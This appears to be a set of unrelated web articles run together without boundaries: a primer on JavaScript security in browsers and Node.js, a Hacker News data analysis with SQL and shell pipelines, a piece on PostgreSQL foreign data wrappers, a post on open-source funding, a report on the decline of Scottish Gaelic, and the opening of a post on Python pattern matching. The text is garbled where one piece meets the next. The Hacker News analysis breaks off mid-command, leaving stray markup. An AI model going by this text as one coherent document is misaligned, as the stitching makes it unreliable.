            <p>JavaScript has no security model. The runtime environments do. This post is a primer on how to think about JavaScript code security in Web browsers and Node.js.</p><p>JavaScript was created to add interactivity to HTML pages. Web browsers were the first runtime environment for JavaScript code.</p><p>When the user visits a Web page, the browser downloads the HTML code of that page and parses it to create the Document Object Model (DOM). The HTML contains information about other assets that need to be downloaded to render the page to the user. This includes stylesheets (CSS), images, other documents to display in frames, and many more.</p><p>The type of asset we are most interested in here is JavaScript code. It is also downloaded by the browser from locations referenced in the HTML.</p><h2 id="same-origin-policy">Same-Origin Policy</h2><p>Users can simultaneously visit many pages in tabs or separate browser windows. JavaScript code downloaded from multiple different sites is executed in the same browser.</p><p>One of those sites could be infected or operated by an attacker. Is this a risk? Could malicious code compromise the machine or steal data from other sites the user is browsing?</p><p>Browsers protect against this. Each Web site executes JavaScript code in a sandbox. Code downloaded from one Web site cannot read or write data from another site. It also cannot call functions or methods across different sites.</p><p>This is called the <a href="https://web.dev/same-origin-policy/">Same-origin policy</a> (SOP) and it is one of the most fundamental security policies on the Web.</p><h2 id="protecting-code-integrity">Protecting Code Integrity</h2><p>Attackers could breach the SOP through the injection of malicious code at the network level, making the injected code appear as coming from the legitimate site. Browsers use the <a href="https://web.dev/why-https-matters/">secure HTTPS protocol</a> to ensure JavaScript code is downloaded from the legitimate server and that the code is not tampered with in transit.</p><p>JavaScript is often distributed using Content Delivery Networks (CDN). Attackers capable of injecting content into the CDN could also compromise the SOP. <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a> (SRI) provides an additional level of protection that allows HTML code to be cryptographically bound to JavaScript code to prevent this.</p><p>Sandboxing is difficult to implement. Browsers use isolation mechanisms provided by the hardware and the operating system. JavaScript code from different sites is executed in separate processes.</p><p>The code in a sandbox is restricted in what it can do. It cannot directly access devices such as webcams or microphones. The filesystem and the local network are also not directly available.</p><p>JavaScript can use those resources only through very limited APIs. This reduces the attack surface. It also allows the browser to always ask the user for explicit permission before uploading files, capturing the webcam, or listening to the user’s microphone.</p><p>Node.js is a runtime environment for JavaScript based on the V8 engine built for the Google Chrome browser. It allows JavaScript code to be executed outside of the browser, typically on servers.</p><p>Node.js does not use the browser sandbox to run JavaScript. Security properties of both execution environments are different:</p><ul><li><strong>Origin</strong>. Browsers download the code and Node.js loads the code from local files like other popular programming languages.</li><li><strong>Trust</strong>. Browsers treat the code as untrusted and Node.js treats the code with full trust.</li><li><strong>Permissions</strong>. Browsers restrict capabilities the code has access to and Node.js grants all the privileges of the operating system account. This includes access to devices, files, and the local network.<br>Impact on Security</li></ul><p>The same JavaScript script or module can be executed in the browser or Node.js. Potential attacks may be different in both environments. The impact of successful exploits may be drastically different. It is very hard to reason about the security of JavaScript code without a specific execution environment in mind.</p><h2 id="browsers">Browsers</h2><p>A successful attack on JavaScript code running in the browser impacts a single user. The impact is limited to what the sandbox, browser APIs, and the user’s explicit consent allow for.</p><p>Compromised JavaScript script or module runs within the context of an authenticated session of the victim and it can perform actions on behalf of the user. In this scenario, the vulnerable code becomes an attack vector against Web applications the victim has legitimate access to.</p><h2 id="node-js">Node.js</h2><p>A successful attack on Node.js programs may impact the entire server the program runs on. The attacker may get access to all the resources the operating system account has access to, potentially leading to a full compromise of the server.</p><p>The next post in this series will demonstrate how the dynamic type system may lead to subtle security bugs.</p><!--kg-card-begin: html-->

<p><img alt="preview" src="https://abetusk.github.io/yahnda/img/preview.png"></p>
<h6 id="2020-07-02">2020-07-02</h6>
<h2 id="introduction">Introduction</h2>
<p>Here I will do some basic analysis of the data provided by 
Y-Combinator's social news site, <a href="https://news.ycombinator.com/">Hacker News</a> (HN).
The analysis presented here is a light hearted meandering through different
aspects of the HN site data.
I've favored an approach that leaves the data interpretation up to the reader
and kept my own interpretation to a minimum.</p>
<p>Doing a search for a snapshot of the HN API data provided some options but nothing
recent and nothing with user information also present, at least, not that I could find.
I decided to scrape what was available from the HN data through their very
nice <a href="https://github.com/HackerNews/API">API</a> and do some rudimentary analysis.</p>
<p>To get a copy of the database to play around with yourself, a snapshot
has been provided as a SQLite file along with the compressed 'raw' JSON files on <a href="https://archive.org/details/HackerNews-Data-2020-06-28">Archive.org</a>.
The raw data is about 3.6Gb compressed and the SQLite file is 5G compressed and 13G uncompressed.</p>
<p>All source code, unless otherwise stated, as well as text and other data, is provided
under a CC0/public domain license.
The Hacker News itself is proprietary and so please check with with the
<a href="https://www.ycombinator.com/legal/#tou">Terms of Use</a>.
I am, no doubt, violating their terms of use so I'm hoping they won't sue me
or take down the data as I'm providing it in the hacker friendly spirit of
data sharing and transparency.</p>
<p>There's nothing novel here, aside, maybe, from an easily downloadable database.</p>
<p>That being said, I imagine a lot of people thinking "so what?" and I'd be hard pressed
to argue with them.</p>
<p>So what? So what! Why not! Let's take a look at Hacker News data!</p>
<h2 id="analysis">Analysis</h2>
<h3 id="overview">Overview</h3>
<p>First let's get an overview of the data:</p>
<pre><code>sqlite&gt; select count(*) from users;
558905
sqlite&gt; select count(*) from item;
23669105
</code></pre>

<p>A breakdown of different types of item data:</p>
<pre><code>sqlite&gt; select count(id), type from item group by type ;
count(id)|type
19882923|comment
13014|job
1788|poll
12164|pollopt
3759216|story
</code></pre>

<p><img alt="submission type" src="https://abetusk.github.io/yahnda/img/overview.png"></p>
<p>Please note the frequency log-scale.</p>
<hr>
<p>Different item data, grouped by month, through time:</p>
<pre><code>sqlite&gt; select count(id), type, substr(datetime(time, 'unixepoch', 'localtime'), 0, 8) mo  from item group by mo, type order by mo asc;
...

</code></pre>

<p><img alt="type vs time" src="https://abetusk.github.io/yahnda/img/type-mo-ts.png"></p>
<h4 id="user-item-frequency">User Item Frequency</h4>
<p>How about the frequency of user item creating (polls, comments, stories, etc.), making sure to filter out blank <code>by</code> fields:</p>
<pre><code>sqlite&gt; select count(id) c, by from item where by != '' group by by order by c desc;
c|by
51639|tptacek
40333|jacquesm
39999|dang
34255|rbanffy
33216|dragonwriter
31837|pjmlp
25573|coldtea
24766|TeMPOraL
24666|DanBC
22665|icebraining
...
</code></pre>

<p>Either because my SQL knowledge is substandard or I don't know what I'm doing with the indexes, I found queries took too long in SQL.
Parsing the JSON directly yields faster results for me.</p>
<p>After some data munging, we get: </p>
<pre><code>zcat $datadir/hn-item*.ajson.gz | \
  jq -r -c '.by ' | \
  grep -P -v '^$' | \
  grep -P -v '^null$' | \
  sort | \
  uniq -c | \
  sort -nr | \
  sed 's/^ *//' &gt; user_item_freq.gp
cut -f1 -d' ' user_item_freq.gp | \
  sort | \
  uniq -c | \
  sort -nr | \
  sed 's/^ *//'  | \
  awk '{ print $2, $1; }' &gt; user_item_freq_freq.gp
./zipf-mle user_item_freq.gp &gt; user_item-exponent-mle.txt
</code></pre>

<p>Looking at a log-log plot of the graph:</p>
<p><img alt="user item frequency" src="https://abetusk.github.io/yahnda/img/user-item-freq.png"></p>
<p>Ah! The tell-tale sign of a power law distribution.</p>
<p>Here it is broken out by <code>story</code> and <code>comment</code> items:</p>
<p><img alt="user story/comment frequency" src="https://abetusk.github.io/yahnda/img/sc-freq.png"></p>
<p>The y-axis being the number of users which have that frequency of item creation and the x-axis is the number of
items created.
For example, you can see <code>tptacek</code> far out on the right, being the only user to have 51639 items created, whereas
users that only have 1 comment, say, are much more frequent.
For context, I'm at 224 item creation (comments and stories combined) and fall in the middle.</p>
<p>Thanks to <a href="https://www.johndcook.com/blog/2015/11/24/estimating-the-exponent-of-discrete-power-law-data/">John D. Cook</a> we can copy-pasta
the maximum likelihood estimator (MLE) code to give us a value of 1.58 for the exponent for all items, 1.54 for comments and 1.77 for stories.
As <a href="https://en.wikipedia.org/wiki/Stable_distribution">a sanity check</a>, they all fall in the range of <code>(1,3)</code>, which is expected
for fat-tailed distributions.</p>
<p>What does it mean? I dunno <code>-\_(:|)_/-</code></p>
<h4 id="user-urls">User URLs</h4>
<p>Let's take a look at the common URLs in the <code>about</code> field from the users on HN.
Getting URLs from the <code>about</code> field in the <code>users</code> table is difficult to do in vanilla SQLite3 syntax, so excuse
the bash incantation:</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo 'select about from users where about like "%https:%";' ) | \
  sed 's/&amp;#x2F;/\//g' | \
  grep -o -P 'https?://[a-zA-Z0-9\.-]*' | \
  sort | \
  uniq -c | \
  sort -rn 
</code></pre>

<p><img alt="User URLs" src="https://abetusk.github.io/yahnda/img/user-url.png"></p>
<p>Please note the log-scale of frequency.</p>
<p>One thing that jumps out is the prevalence of <code>keybase.io</code>.
I can only assume that Y-Combinator has some close relationship to <code>keybase.io</code>, maybe going to far as
insisting folks going through their program use it.</p>
<p>Another point of note is the high occurrence of sites like <code>hackernewsers.com</code>.
An unkind interpretation would be that some folks are trying to game the HN system
to give a signal boost to their site.</p>
<p>Note that this analysis counts subdomains as separate URLs.
I don't want to get too far into the weeds with this analysis but your own
could include better handling and binning of URLs like <code>github.io</code> or <code>tumblr.com</code> sites.</p>
<h4 id="item-frequency-by-time">Item Frequency by Time</h4>
<p>Let's start with looking at activity of stories and comments during the day.
So we're not deluged by extraneous data, let's just take data from Jan 1st 2020 (unixtime <code>1577854800</code>):</p>
<pre><code>echo 'select substr(datetime(time, "unixepoch", "utc"), 12, 5) t from item where time &gt;= 1577854800 and time != "" ;' | \
  sqlite3 hn.sqlite | \
  tr ':' ' ' | \
  awk '{ print ($1 &lt; 10)? ($1+24 + $2/(60)) : ($1+$2/60), $3; }' | \
  sort -n 
</code></pre>

<p><img alt="UTC Time of Day Item" src="https://abetusk.github.io/yahnda/img/item-tod-unshifted.png"></p>
<p>Whoa! Seems like a pretty clear signal.</p>
<p>Let's shift so we see the trend with a bit more clarity:</p>
<pre><code>echo 'select substr(datetime(time, "unixepoch", "utc"), 12, 5) t from item where time &gt;= 1577854800 and time != "" ;' | \
  sqlite3 hn.sqlite | \
  tr ':' ' ' | \
  awk '{ print ($1 &lt; 10)? ($1+24 + $2/(60)) : ($1+$2/60), $3; }' | \
  sort -n 
</code></pre>

<p><img alt="UTC Time of Day Item shifted" src="https://abetusk.github.io/yahnda/img/item-tod.png"></p>
<p>16:00 UTC is 09:00 AM PT, so I would guess HN is pretty (US) west coast centric with the majority of activity happening
at the start of the business day.</p>
<p>I wouldn't guess any big surprises, but let's split it out by stories and comments:</p>
<p><img alt="UTC story and comment ToD" src="https://abetusk.github.io/yahnda/img/sc-tod.png"></p>
<p>Note that the story submissions are much less prevalent than comments and are plotted with different Y axies.</p>
<p>It should be obvious but I only realized this in retrospect from looking at the data that comments have a lag
behind stories, for probably obvious reasons.</p>
<hr>
<p>Let's see if we can pick out any weekend effects.</p>
<pre><code>echo -e '.separator " "\nselect strftime("%w", datetime(time, "unixepoch", "utc")), substr(datetime(time, "unixepoch", "utc"), 12, 5), type from item where time &gt; 1577854800 and time != "";' | \
  sqlite3 hn.sqlite &gt; item-tow.raw
grep -P ' (comment|story)$' item-tow.raw | \
  cut -f1,2 -d' ' | \
  sort  | \
  uniq -c | \
  sed 's/^ *//' | \
  tr ':' ' ' | \
  awk '{ print $2 + ($3/24) + ($4/(24*60)), $1; }' | \
  sort -n
</code></pre>

<p><img alt="item time of week" src="https://abetusk.github.io/yahnda/img/item-tow.png"></p>
<p>Again, no big surprises.</p>
<p>Here, 0 is Sunday and 6 is Saturday (the results of using <code>%w</code> in <code>strftime</code>) and times are in UTC properly rescaled.</p>
<p>I would guess most people interact with HN during the weekday and peter off on the weekends, with Sunday being the least active day.</p>
<h4 id="story-word-clouds">Story Word Clouds</h4>
<p>Let's look at a trigram word cloud for stories in 2019 and 2020 (so far):</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != '' and substr(datetime(time, 'unixepoch', 'utc'), 1,4) = '2019' and time &gt;= 1546318800 order by id desc;" ) | \
  ./trigrams | \
  iconv -f utf-8 -t ascii//translit | \
  tr ',-.:!'"'"'"' '_'  &gt; 2019-filtered.trigrams
./plot-wordcloud 2019-filtered.trigrams hn-2019-trigram.png
sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != '' and substr(datetime(time, 'unixepoch', 'utc'), 1,4) = '2020' and time &gt;= 1577854800 order by id desc;" ) | \
  ./trigrams | \
  iconv -f utf-8 -t ascii//translit | \
  tr ',-.:!'"'"'"' '_'  &gt; 2020-filtered.trigrams
./plot-wordcloud 2020-filtered.trigrams hn-2020-trigram.png
</code></pre>

<p>2019:</p>
<p><img alt="HN 2019 Trigrams" src="https://abetusk.github.io/yahnda/img/hn-2019-trigram.png"> </p>
<p>2020 (so far):</p>
<p><img alt="HN 2020 Trigrams" src="https://abetusk.github.io/yahnda/img/hn-2020-trigram.png"></p>
<p>Please excuse the underscores I'm being lazy and constructing "single" words by concatenating three words together
to fool <a href="https://github.com/amueller/word_cloud/">amueller/word_cloud</a> into constructing the word cloud.</p>
<p>Note that these are for stories that have a score of more than 30.
The mangling of the title might also have an effect, so take care to not read too much into the word cloud.
Also note that I don't think there's a way to really get at what stories were on the front page with this data
so that might skew interpretation.</p>
<p>You can also see some topical subjects from 2019, like the Hong Kong protests, the Boeing 737 and Raspberry Pi 4.
I guess the take away is there's a lot of 'ask' and 'show' stories that are popular.
I would interpret this as the community tends to like posts that they can actively engage in.
It'll be a cute meta-analysis to see if this post lands on the front page of HN ;).</p>
<p>I picked tri-grams pretty arbitrarily.
Single words and bi-grams don't really provide enough information to be interesting to me.
Tri-grams look to have just enough interesting information to at least give the illusion
of insight before being drowned out by the combinatorial explosion of choices.</p>
<h4 id="story-topic-modeling">Story Topic Modeling</h4>
<p>Engaging in some more tea leaf reading, we can do some <a href="http://mallet.cs.umass.edu/topics.php">topic modeling</a>.
Topic modelling is new to me but I discovered it
from the excellent <a href="https://greg.blog/2013/01/26/unix-bi-grams-tri-grams-and-topic-modeling/">blog post on using UNIX for Bi/Tri-Grams</a>.</p>
<p>Running a query against 2020 HN stories (so far):</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != ''  and time &gt;= 1546318800 and time &lt;= 1609477200; " ) &gt; hn-story-2020.txt

  --input hn-story-2020.txt \
  --output data.mallet \
  --keep-sequence \

</span></code></pre></section></section><section><h2 id="what-are-foreign-data-wrappers">What are foreign data wrappers?</h2><p>The easiest way to describe foreign data wrappers is by considering UNIX files. A UNIX file isn't always pointing to a local file on your disk. It could be a file stored on NFS, in a remote S3 bucket or even a shim that lets you manipulate a device on your machine.</p><p>In UNIX, a file is a pretty strong abstraction that doesn't get broken. An IDE doesn't need to know that the file it's editing is on a remote filesystem. It can work with it by issuing the same ordinary read and write calls. Someone who writes a new filesystem doesn't need to make sure that it's compatible with all existing tools. Instead, they can write a driver that mounts the filesystem to a mountpoint.</p><p>PostgreSQL FDWs resemble mounting in that respect. Foreign tables mostly behave like normal tables and can receive the same <code>SELECT/INSERT/UPDATE/DELETE</code> queries. Behind the scenes, the wrapper's only job is to emit tuples.</p></section><section><h2 id="why-should-i-use-fdws">Why should I use FDWs?</h2><p>Foreign data wrappers are a great alternative to ETL. Instead of loading data into your warehouse that you might never use, you can mount the remote database and query it on demand.</p><p>Because they integrate with the PostgreSQL query planner, FDWs have a decent performance. The FDW can push down qualifiers and even aggregations to the remote database. FDWs can report the rough costs of starting a scan and fetching a tuple back to the query planner. This lets the query planner choose, for example, whether running multiple small single scans or one big one is a better strategy for satisfying a JOIN.</p><p>It's straightforward to write your own FDW and the <a href="https://www.postgresql.org/docs/12/fdwhandler.html" as="https://www.postgresql.org/docs/12/fdwhandler.html">PostgreSQL documentation</a> covers it extensively. The <a href="https://github.com/wikrsh/hello_fdw/" as="https://github.com/wikrsh/hello_fdw/">hello-world FDW</a> that returns "Hello, World" in a table is only a couple hundred lines of C code. If you prefer to focus on development simplicity, you can use Multicorn instead of raw C.</p><p>There are plenty of open-source foreign data wrappers available. They let you query other RDBMSs, NoSQL databases, CSV files or column stores. The <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers" as="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">PostgreSQL wiki</a> lists some of them.</p><p>Using a foreign data wrapper for your database or data source gives you access to a huge ecosystem of software that works with PostgreSQL. We can almost call this a network effect. A new data source that is accessible via an FDW enhances everything that works with PostgreSQL.</p></section><section><h2 id="why-use-fdws-with-splitgraph">Why use FDWs with Splitgraph?</h2><p><a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">Foreign data wrappers</a> are one of the ways that Splitgraph aims to make data engineers' and data scientists' work easier.</p><p>Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command handles the boilerplate around FDW initialization.

    <div>
      
      
      
      <p>Recently I received an invite to the GitHub Sponsors program so I figured I’d make a sponsorship page. Building <a href="https://github.com/users/giuseppeg/sponsorship">my sponsorship profile</a> was fun!</p>

<figure>
<img src="https://user-images.githubusercontent.com/711311/66648695-78bed800-ec2c-11e9-8cf3-6a46c5bd3511.jpeg" alt="">
<figcaption>My Sponsorship Profile.</figcaption>
</figure>

<p>Having to define dontation tiers was an interesting exercise because I had to figure out reasons that would convince (will they?) people that the donation is worth it somehow. What can I offer in my spare time? What are supporters getting in return? Is it valuable?</p>

<h2 id="will-it-work">Will it work?</h2>

<p>Getting people to donate is a very hard thing to do, and it is definitely harder for those who are no influencers because they lack visibility.</p>

<p>Not to mention that asking for a donation feels a bit like asking strangers on the street for money, maybe for a service that you deliver to somebody else. 🙃</p>

<p><del>Overall, I have a job and I am lucky enough to not have to rely on OSS funding to make a living</del>. <a href="https://giuseppegurgone.com/hire-me">I am available for hire</a>. I work on side projects and OSS at random times and for fun, so much so that I started a (very WIP) personal <a href="https://github.com/giuseppeg/contributing">Open Source Contributor Manifesto and Policies</a> to communicate this to others.</p>

<p>If you want to pursuit the OSS funding path my recommendation would be to invest in personal branding first.</p>

<div>
<blockquote data-conversation="none" data-link-color="#008000">
<div lang="en" dir="ltr"><p>Want to know the real answer? Marketing!</p><p>- Speak at confs<br>- Write articles<br>- Tweet tweet tweet tweet tweet</p></div>— Max Stoiber (<a href="https://twitter.com/mxstbr">@mxstbr</a>) <a href="https://twitter.com/mxstbr/status/1026334495975329793?ref_src=twsrc%5Etfw">August 6, 2018</a>
</blockquote> 
</div>

<p><strong>Update</strong> to date I have <strong>0</strong> sponsors. Clearly I haven’t worked on marketing and none of my projects is that valuable, yet I get a constant stream of issues/PRs.</p>

<h2 id="alternatives-to-donation-based-systems">Alternatives to donation-based systems</h2>

<p>GitHub Sponsors and donation based platforms are great for some, but ultimately I think that the path to OSS sustainability is to reward developers based on usage stats (installs or consumers/licenses) or provide services around OSS.</p>

<p>For example I have this tiny project that has 24k downloads a month. In this space it is nothing but nonetheless it is definitely providing value to some. How could this translate to a few bucks? 🤷‍♂️</p>

<figure>
<img src="https://user-images.githubusercontent.com/711311/66648696-78bed800-ec2c-11e9-81b2-1ba89b4cf668.png" alt="">
<figcaption>Non-profitable OSS with 24k monthly download.</figcaption>
</figure>

<h3 id="services">Services</h3>

<p>The more I observe the OSS space, the more I think that the only real way to make OSS sustainable is to build services around it and sell those instead of the software itself.</p>

<p>Focusing on providing services has proven to be working well for many companies.</p>

<p>On the other end this means that individual contributors are now required to build a business to sustain their work on the actual code and not every developer is a business person.</p>

<h3 id="paid-packages">Paid Packages</h3>

<p>A very controversial solution that I have had in mind for a while is <em>paid packages</em>.</p>

<p>Library owners could make a buck from every user of their library by integrating with a centralized service that would require customers to provide a license token (in the form of environment variable) when they install a library. When users haven’t paid for the library, the install would fail.</p>

<figure><pre><code data-lang="bash"><span>$ PAID_PACKAGES_TOKEN</span><span>=</span>123 pip <span>install</span> &lt;package-name&gt;
🔴 PAID PACKAGES: Error
   &lt;package-name&gt; is a paid package.
   In order to use it please donate <span>$1</span> a month to it.
https://paidpackages.io/support/package-name</code></pre></figure>

<p>Core members of packages (maintainers) would do revenue sharing or collect funds under an organization. Occasional contributors would either get some kind of credit or get to use the library for free.</p>

<p>You can read <a href="https://github.com/giuseppeg/paid-packages">more about this idea on GitHub</a>.</p>

<h3 id="support-and-training">Support and Training</h3>

<p>Selling support and training are probably other viable options for people who want to live off of Open Source Software. I doubt that this is a viable option for the ones who work on OSS in their spare time. The tough truth is that <strong>many OSS contributors have a full time job</strong>!</p>

<h3 id="getting-hired">Getting Hired</h3>

<p>There are companies that use and produce Open Source Software all the time. An example are ZEIT or Gatsby. Getting a job at such companies could potentially mean that you wouldn’t have to work on OSS in your spare time anymore.</p>

<h3 id="crowdfunding">Crowdfunding</h3>

<p>Starting a campaign on crowfunding sites could be a good way to boostrap FOSS development.</p>

<p>A successful example of this model is <a href="https://www.indiegogo.com/projects/prosemirror/">ProseMirror’s campaign on Indiegogo</a>. They managed to raise $50000 to support the development of the project.</p>

<h3 id="npm-inc">npm Inc.</h3>

<p>npm Inc. is in a unique position because they own the biggest and most popular package registry and because they don’t yet provide a service to package owners for monetizing their software.</p>

<p>I really hope that they are monitoring the donation based space and eventually will come up with a better solution for everybody (even the small <em>fish</em>) that is <strong>not yet another donation based platform</strong>!</p>

<p><strong>Update</strong> forget this, <a href="https://github.blog/2020-04-15-npm-has-joined-github">npm has been acquired by GitHub</a> :)</p>

<h3 id="a-success-story">A Success Story</h3>

<p>If you want to read about a success story check this out <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it">https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it</a>.</p>

<p>My takeaway from it is that eventually you end up becoming a marketer more than a developer but I guess that’s part of the game 🤷‍♂️</p>

<p>A new study&nbsp;on the fortunes and fate of the Gaelic language in Scotland casts serious doubt on its survival in the medium to long-term in the region&nbsp;where it is still spoken.</p>
<p>Researchers&nbsp;say that without intervention Gaelic will no longer be spoken as a community language within a few short years and will be&nbsp;completely replaced by&nbsp;functionally dominant English.&nbsp;</p>
<p>Gaelic was&nbsp;once spoken in the whole of Scotland&nbsp;but is now on UNESCO's list of endangered languages.&nbsp;</p>
<p>The new&nbsp;research, published today on behalf of the University of the Highlands and Islands, was carried out in the only region&nbsp;of Scotland where there is still a Gaelic&nbsp;community - the Western Isles, Staffin in the Isle of Skye and the Isle of Tiree in Argyll and Bute.</p>
<p>According to the 500-page study,&nbsp;the social use&nbsp;and transfer&nbsp;of Gaelic from the older generations to the younger generation in this region are in a state of&nbsp;collapse. In short, the researchers claim, the Gaelic community does not currently have the collective resources to renew itself.&nbsp;</p>
<p>Out of a population of around&nbsp;28,000, the research indicates that over 14,000 have some ability in Gaelic. When statistically examined, however, the actual number&nbsp;is&nbsp;less than 11,000, the majority of whom are aged 50&nbsp;and over.</p>

</figure>
<p>The main findings of the research are:&nbsp;</p>
<p>- Low levels of ability in Gaelic among the young</p>
<p>- Marginal use of the language in most social contexts, except among the elderly</p>
<p>- Marginal presence of Gaelic in schooling</p>
<p>- Indifference of most young people towards the language</p>
<p>- Severely reduced family and community transfer&nbsp;of Gaelic to the younger generation.</p>

<p>The research was carried out&nbsp;using census data for the years 1981-2011,&nbsp;surveys of pre-school children and teenagers, focus groups and&nbsp;public meetings, as well as&nbsp;in-depth questionnaires.</p>
<p>Analysis of the census figures shows a 13% average decline per decade of Gaelic speakers in the research area.&nbsp;</p>
<p>At the 2011 census, 52% of people reported an ability to speak Gaelic compared to 80% at&nbsp;the 1981 census.</p>

</figure>
<p>The decline of Gaelic is&nbsp;particularly chronic among the young. At the 2011 census, less than 2,000 young people,&nbsp;42% of those aged between 3 and 17, were reported to have some&nbsp;ability in Gaelic.</p>
<p>In a questionnaire, conducted in 2016,&nbsp;only 1.5% of teenagers reported that they always or mainly speak Gaelic to their friends.</p>
<p>The census figures also show Gaelic&nbsp;is spoken&nbsp;in just 19% of households. The researchers say&nbsp;that this is a considerable&nbsp;impediment to the substantial transfer of&nbsp;Gaelic&nbsp;from the older generations to the younger generation.</p>
<p>Based on the&nbsp;current trajectory, the researchers predict that in this decade the language&nbsp;will reach a "critical threshold of non-viability."</p>
<p>They say that Gaelic&nbsp;will retreat further and irrevocably to marginal aspects of community life, to institutional practice - such as&nbsp;education&nbsp;and the media - and to use among the elderly.&nbsp;</p>

</figure>
<p>The researchers make several recommendations in order to halt the decline&nbsp;of&nbsp;Gaelic and&nbsp;call for&nbsp;"a re-orientation of public policy and interventions focused at the community level."</p>
<p>Indeed, they claim&nbsp;that current policy is "a significant hindrance" to the&nbsp;preservation and revival of Gaelic.</p>
<p>The researchers' main recommendation is the adoption&nbsp;of a&nbsp;"co-operative model" based on "a comprehensive language-in-society approach."</p>
<p>This would involve establishing a Gaelic Community Trust based in the islands under the direct democratic control of a representative group of community members.</p>
<p>Decision-making would be transferred to this trust from the state-run&nbsp;Bòrd na Gàidhlig (Gaelic Board) which is currently based in Inverness.&nbsp;</p>
<p>This trust would undertake initiatives such as a financial incentive&nbsp;to encourage families to speak Gaelic to their children; renewed Gaelic-based youth group activities; public entertainment through the medium of Gaelic; encouraging Gaelic social enterprises; increasing&nbsp;Gaelic-medium provision in schools; and the provision of language planning&nbsp;strategic advice and support to Gaelic community groups and to the leadership of the trust.</p>
<p>The trust, the researchers claim, would also bring broader socio-economic benefits to the islands, helping to tackle&nbsp;emigration and the lack of employment opportunities, which have been core factors in the decline of Gaelic.&nbsp;</p>

<p>The head of the&nbsp;research team, Irish sociolinguist Prof Conchúr Ó Giollagáin, says&nbsp;it is self-evident that languages survive and thrive&nbsp;in speaker communities rather than at&nbsp;a rootless institutional or&nbsp;symbolic level.&nbsp;</p>
<p>He says that languages&nbsp;require a socio-geographic space, such as a Gaeltacht.</p>
<p>Prof Ó Giollagáin claims that over-emphasis in public policy or discourse on the language-learner sector can result in the neglect of&nbsp;language communities&nbsp;and of&nbsp;the social processes that affect those communities.&nbsp;It can also result&nbsp;in irrelevant or detrimental public policy, he says.&nbsp;</p>
<p>Prof Ó Giollagáin believes that Scottish Gaelic can face up to the challenges&nbsp;to its sustainability if people accept&nbsp;that the status quo is not an option. He claims&nbsp;the new research provides&nbsp;detailed data, a clear diagnosis and a pathway out of the crisis.&nbsp;</p>
<p>The study is available&nbsp;in book form under the title "The Gaelic Crisis in the Vernacular Community: A Comprehensive Sociolinguistic Study of Scottish Gaelic" and is published by Aberdeen University Press.&nbsp;</p>

July 2, 2020 | https://ncik-roberts.github.io/posts/pep622.html | <a href="https://web.archive.org/web/*/https://ncik-roberts.github.io/posts/pep622.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      

      

<p><a href="https://www.python.org/dev/peps/pep-0622/">PEP 622</a> proposes adding a pattern matching construct to Python. Pattern matching allows the programmer to destructure data with a syntax that mirrors the construction syntax. The proposal brings Python in-line with many other modern programming languages, like Haskell, OCaml, and Rust. However, two features included in the proposal (or-patterns and guards) interact in a perhaps surprising way—see <a href="https://hal.inria.fr/hal-01413241/document">this paper</a> for an explanation of this interaction as it relates to OCaml, another language with both or-patterns and guards.</p>

<p>You can try out an in-progress implementation of this PEP at this fork of cpython: <a href="https://github.com/brandtbucher/cpython/tree/patma">https://github.com/brandtbucher/cpython/tree/patma</a>.</p>

<p>In the rest of this post, I’ll briefly summarize pattern matching, define or-patterns and guards, and show the surprising behavior in the context of Python.</p>

<h2 id="example-of-pattern-matching">Example of pattern matching</h2>

<p>Before the proposal, here’s how you might write a function that classifies a pair of animals according to their kind</p>

<div><div><pre><code><span>class</span> <span>Dog</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
    <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

<span>class</span> <span>Cat</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>age</span><span>):</span>
    <span>self</span><span>.</span><span>age</span> <span>=</span> <span>age</span>

<span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>if</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Cat</span><span>):</span>
    <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>age</span><span>))</span>
  <span>elif</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Dog</span><span>):</span>
    <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>name</span><span>))</span>

<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"Fido"</span><span>))</span>
<span># prints: A dog named Fido
</span>
<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>))</span>
<span># prints: A cat that's 3 years old
</span></code></pre></div></div>

<p>Under the proposal, this is how you could write <code>classify</code>:</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>):</span>
      <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>age</span><span>))</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>name</span><span>))</span>
</code></pre></div></div>

